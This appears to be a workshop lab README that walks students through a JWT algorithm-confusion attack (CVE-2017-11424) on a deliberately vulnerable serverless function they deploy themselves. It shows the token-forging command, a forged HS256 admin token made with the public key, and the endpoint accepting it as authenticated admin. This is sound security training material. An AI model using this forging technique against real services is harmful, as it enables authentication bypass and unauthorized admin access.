# Algorithm Confusion

You can read more about this flaw here: 
* [CVE-2017-11424](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=873244)
* [Auth0 Blog](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

## Instructions
* In your image, navigate over to `/root/labs/Serverless-Workshop/`
* Now run `pipenv shell`
* In your image, navigate over to `/root/labs/Serverless-Workshop/Algo-Confusion`
* Run `sls plugin install -n serverless-python-requirements`
* Wait for instructor to explain the contents of the lab
* Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/Algo-Confusion/serverless.yml)
* Deploy the function with the command `sls deploy`
* Wait for the function to deploy completely. you should see something like this: 

```bash
Serverless: Stack update finished...
Service Information
service: we45-sls-workshop-algo-confusion
stage: dev
region: us-west-2
stack: we45-sls-workshop-algo-confusion-dev
resources: 18
api keys:
  None
endpoints:
  GET - https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/init
  GET - https://XXXXXX.execute-api.us-west-2.amazonaws.com/dev/verify
functions:
  init-algo: we45-sls-workshop-algo-confusion-dev-init-algo
  verify-algo: we45-sls-workshop-algo-confusion-dev-verify-algo
```

Now run: 

```bash
http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/init
```

You should get a response like so: 

```json
{
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImF1dGhlbnRpY2F0ZWQiOmZhbHNlfQ.Nz39CRtIFrCsX76B9Dq0aEOSsWQ9UwDFNqla1Xj1PHiIOSh0WFcJHWEO1NF7YKq6Uv8C__tKQA2fg3qH_m7gLSLkQSf2eGRAubJXMU2XRRlkhMKvI6iksEnjUBvRAbt_UhN5mDcXHjBpX_1q2wadmVbiBz6YkfkffdTMas7ywLFK43tKvL9Iw32fRgoP__K93EaYdvT8Wxm0LdMU_RxmBqjrf4nwTrGynwoWqc2ZRKYa7tZMNCGNIEiNQxK1b4p39MpZqwhIVkFsFMNwd_jECE0nfzcskTQdtZG4KC1WLSnOB7XNjWwAM_NUujCp_sB_iTcEGQlBfo-Oxx5yULXSBA"
}
```

Now run `python token_gen.py public.pem`. You should see a response like so: 

```bash
[+] Token is:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlfQ.kdps5gagmmxBnnwtAIuEtJBMu6rWjG8wY4V2X9jlfOM
``` 

Copy the token and run: 

```bash
http GET https://XXXXXX.execute-api.us-west-2.amazonaws.com/dev/verify Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlfQ.kdps5gagmmxBnnwtAIuEtJBMu6rWjG8wY4V2X9jlfOM
```

You should see a response like this: 

```bash
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 40
Content-Type: application/json
x-amzn-RequestId: e66e15fb-b1b2-11e9-8818-53f47d545fa4

{
    "authenticated": true,
    "user": "admin"
}
```

### Teardown

* In your image, navigate over to `/root/labs/Serverless-Workshop/Algo-Confusion`
* Run `sls remove` to remove stack